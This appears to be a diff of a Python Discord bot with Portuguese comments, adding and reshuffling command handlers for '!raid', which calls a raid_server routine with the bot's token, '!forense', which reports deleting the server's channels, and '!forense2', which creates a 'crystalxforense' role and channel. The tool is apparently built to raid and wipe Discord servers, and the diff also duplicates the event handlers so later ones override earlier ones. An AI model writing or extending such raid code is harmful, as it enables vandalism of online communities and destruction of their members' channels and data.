@@ -166,7 +166,7 @@ def start_scanner():
 # 🧠 Thread de comando para enviar mensagem enquanto o scanner roda
 # =========================
 def comando_input():
-    global TOKEN, CHANNEL_ID
+    global TOKEN, CHANNEL_ID, client
     while True:
         cmd = input()
         if cmd.startswith("!enviar "):
@@ -226,7 +226,7 @@ async def raid_server(guild, token):
     print("Raid concluída!")
 
 # =========================
-# Evento do discord para detectar comando !raid e comandos forense
+# Evento do discord para detectar comando !raid
 # =========================
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
@@ -237,10 +237,30 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
-    # Evitar loops
     if message.author == client.user:
         return
+    if message.content.startswith("!raid"):
+        perms = message.author.guild_permissions
+        if not perms.manage_channels:
+            await message.channel.send("Você não tem permissão para fazer isso.")
+            return
+        await message.channel.send("Iniciando raid...")
+        guild = message.guild
+        await raid_server(guild, client.http.token)
 
+# =========================
+# =========================
+# Comandos do bot: forense e forense2
+# =========================
+@client.event
+async def on_ready():
+    print(f'Logado como {client.user}')
+    # Aqui podemos também registrar comandos ou qualquer configuração ao iniciar
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
     # Comando para iniciar raid
     if message.content.startswith("!raid"):
         perms = message.author.guild_permissions
@@ -249,7 +269,6 @@ async def on_message(message):
             return
         await message.channel.send("Iniciando raid...")
         await raid_server(message.guild, client.http.token)
-
     # Comandos forense
     elif message.content.startswith("!forense"):
         guild = message.guild
@@ -260,21 +279,20 @@ async def on_message(message):
             except:
                 pass
         await message.channel.send("Canais deletados!")
-
     elif message.content.startswith("!forense2"):
         guild = message.guild
         await message.delete()
-        # Criar cargo se não existir
+        # Criar cargo
         role_name = "crystalxforense"
         existing_roles = [role for role in guild.roles if role.name == role_name]
         if not existing_roles:
             await guild.create_role(name=role_name)
-        # Criar canal se não existir
+        # Criar canal
         channel_name = "crystalxforense"
         existing_channels = [ch for ch in guild.channels if ch.name == channel_name]
         if not existing_channels:
             await guild.create_text_channel(name=channel_name)
-        await message.channel.send("Cargo e canal criados!")
+        await message.channel.send("Cargos e canais criados!")
 
 # =========================
 # =========================
